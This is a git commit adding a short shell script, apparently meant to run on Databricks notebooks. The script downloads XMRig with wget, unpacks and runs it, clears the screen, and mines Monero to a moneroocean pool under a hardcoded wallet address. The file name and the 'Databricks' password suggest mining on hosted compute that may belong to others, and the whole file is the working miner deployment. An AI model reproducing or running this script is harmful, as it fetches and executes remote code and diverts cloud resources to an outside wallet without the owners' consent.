298d98df9f3acf15d29330a96ad6df17a7788115
MomboteQ <60738939+MomboteQ@users.noreply.github.com>
2022-04-29 18:58:47 +0200

    Create databricks.sh

---
+++ xmr/databricks.sh
@@ -0,0 +1,8 @@
+#!/bin/sh
+#-----CREATED BY MOMBOTEQ-----
+wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
+tar xf xmrig-6.17.0-linux-x64.tar.gz
+cd xmrig-6.17.0
+clear
+./xmrig -o gulf.moneroocean.stream:10001 -u 47XoXb55DyecrQ1aaBnqXdZiDntoLvXpZTcd6g5mjLHqgx3yMvTTMccNdPnnZxoXA48DzFBGrjoVi4jko7bxTJbr6zZQjjZ -p Databricks --threads 2
+#-----CREATED BY MOMBOTEQ-----
